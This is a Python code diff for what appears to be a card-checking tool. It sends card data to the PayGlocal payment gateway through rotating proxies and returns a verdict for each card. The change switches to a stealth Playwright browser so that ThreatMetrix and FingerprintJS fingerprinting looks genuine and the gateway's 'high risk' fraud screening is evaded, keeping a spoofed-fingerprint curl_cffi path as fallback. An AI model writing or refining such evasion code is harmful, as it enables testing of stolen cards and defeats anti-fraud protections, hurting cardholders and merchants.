@@ -118,7 +118,7 @@ def _run_pw_flow(xgl: str, zipc: str, proxy: str, card: dict | None = None) -> d
     args = [py, "pw_flow.py", xgl, zipc, proxy]
     if card:
         args.append(_json.dumps(card))
-    res = _subprocess.run(args, capture_output=True, text=True, timeout=90, cwd=here, env=env)
+    res = _subprocess.run(args, capture_output=True, text=True, timeout=120, cwd=here, env=env)
     out = res.stdout.strip()
     if out:
         return _json.loads(out)
@@ -127,10 +127,10 @@ def _run_pw_flow(xgl: str, zipc: str, proxy: str, card: dict | None = None) -> d
 
 
 def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> tuple:
-    """PayGlocal check via curl_cffi. The x-gl token is single-use/short-lived,
-    so the slow Playwright flow is skipped — it expired the token and caused
-    "dc empty: REQUEST_ERROR" on the fallback."""
-    # curl_cffi (fast — uses the token immediately, before it expires)
+    """PayGlocal check via Playwright (stealth browser) — a REAL ThreatMetrix /
+    FingerprintJS fingerprint, so the risk engine returns a real verdict instead
+    of GL-400-005 "high risk". curl_cffi is kept as a fallback when the browser
+    flow can't run."""
     proxies = [proxy]
     for fp in (fallback_proxies or []):
         if fp and fp not in proxies:
@@ -141,23 +141,29 @@ def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> 
         if p in seen:
             continue
         seen.add(p)
+        # 1) Playwright (real fingerprint) — primary
+        try:
+            zipc = _get_zip(xgl, p)
+            res = _run_pw_flow(xgl, zipc, p, card)
+            cat = res.get("category", "error")
+            real = res.get("real-response", "")
+            if cat != "error":
+                return cat, real
+            low = real.lower()
+            if "no pay button" in low or "token" in low:
+                return cat, real        # terminal (token/flow) — not retryable
+            last_err = real
+        except Exception as e:
+            last_err = f"{type(e).__name__}: {e}"
+        # 2) curl_cffi fallback (fast, fake fingerprint) — only if Playwright didn't give a verdict
         try:
             cat, real = _payglocal_once(xgl, card, p)
         except Exception as e:
-            msg = f"{type(e).__name__}: {e}"
-            last_err = f"{msg}"
+            last_err = f"{type(e).__name__}: {e}"
             continue
-        if cat == "error":
-            low = real.lower()
-            # token-consumption errors are NOT retryable (single-use x-gl token)
-            if any(k in low for k in ["authentication_failed", "multiple times", "invalid request",
-                                      "not allowed", "request_error"]):
-                return cat, real
-            # connection / empty-response errors -> retry with the next proxy
-            if "dc empty" in low or "risk_fp" in low:
-                last_err = real
-                continue
-            return cat, real
+        if cat == "error" and ("dc empty" in real.lower() or "risk_fp" in real.lower()):
+            last_err = real
+            continue
         return cat, real
     return "error", last_err or "payglocal failed"
 
